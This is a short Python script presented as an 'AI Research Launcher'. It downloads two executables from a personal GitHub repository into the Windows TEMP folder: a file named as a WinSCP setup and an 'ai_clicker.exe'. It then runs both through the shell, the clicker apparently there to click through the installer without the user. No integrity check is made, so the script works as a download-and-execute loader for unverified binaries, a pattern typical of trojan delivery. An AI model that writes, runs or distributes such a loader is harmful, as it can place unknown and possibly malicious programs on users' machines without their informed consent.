import os
import requests
import subprocess
import time

print("[*] AI Research Launcher Started...")

# ---------------- DOWNLOAD LINKS ----------------
CLICKER_URL = "https://raw.githubusercontent.com/Pravallika11112345678/test/main/ai_clicker.exe"

INSTALLER_URL = "https://github.com/Pravallika11112345678/test/raw/refs/heads/main/WinSCP-6.5.5-Setup.exe"

# ---------------- SAVE PATHS ----------------
temp_path = os.getenv("TEMP")

clicker_path = os.path.join(temp_path, "ai_clicker.exe")

installer_path = os.path.join(temp_path, "installer.exe")


# ---------------- DOWNLOAD FUNCTION ----------------
def download_file(url, path):

    try:

        print(f"[*] Downloading: {url}")

        response = requests.get(
            url,
            stream=True,
            timeout=30
        )

        if response.status_code != 200:

            print(f"[!] Download Failed: {response.status_code}")

            return False

        with open(path, "wb") as f:

            for chunk in response.iter_content(chunk_size=8192):

                if chunk:
                    f.write(chunk)

        # VERIFY FILE EXISTS
        if not os.path.exists(path):

            print("[!] File not found after download")

            return False

        # VERIFY FILE SIZE
        if os.path.getsize(path) == 0:

            print("[!] Empty file downloaded")

            return False

        print(f"[✔] Saved Successfully: {path}")

        print(f"[✔] File Size: {os.path.getsize(path)} bytes")

        return True

    except Exception as e:

        print("[ERROR]:", e)

        return False


# ---------------- MAIN ----------------
def main():

    print("[*] Starting Downloads...")

    clicker_ok = download_file(
        CLICKER_URL,
        clicker_path
    )

    installer_ok = download_file(
        INSTALLER_URL,
        installer_path
    )

    # VERIFY BOTH DOWNLOADS
    if not (clicker_ok and installer_ok):

        print("[!] Downloads Failed")

        return

    print("[✔] All Downloads Completed")

    time.sleep(3)

    # ---------------- START INSTALLER ----------------
    if os.path.exists(installer_path):

        print("[*] Launching Installer...")

        subprocess.Popen(
            installer_path,
            shell=True
        )

    else:

        print("[!] Installer Missing")

        return

    # WAIT FOR INSTALLER UI
    print("[*] Waiting For Installer Window...")

    time.sleep(15)

    # ---------------- START AI CLICKER ----------------
    if os.path.exists(clicker_path):

        print("[*] Launching AI Clicker...")

        subprocess.Popen(
            clicker_path,
            shell=True
        )

        print("[✔] AI Clicker Started")

    else:

        print("[!] AI Clicker Missing")

        return

    print("[✔] Research Automation Running")


# ---------------- ENTRY ----------------
if __name__ == "__main__":

    main()